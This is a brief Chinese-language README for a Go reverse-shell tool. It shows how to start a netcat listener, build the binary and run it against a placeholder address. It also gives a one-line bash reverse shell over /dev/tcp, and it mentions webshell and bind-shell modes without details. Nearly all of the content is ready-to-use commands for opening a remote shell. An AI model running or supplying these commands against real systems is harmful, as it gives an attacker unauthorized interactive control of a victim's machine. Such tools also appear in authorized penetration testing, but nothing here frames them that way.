# shell

## 反向连接
启动服务:
`nc -lvp 33889`

编译运行:
```
go build
./shell 10.10.x.x:33889
```


命令行bash反弹:
```
bash -i >& /dev/tcp/10.10.x.x/33889 0>&1
```

## webshell:
看代码

## bind_shell:
看代码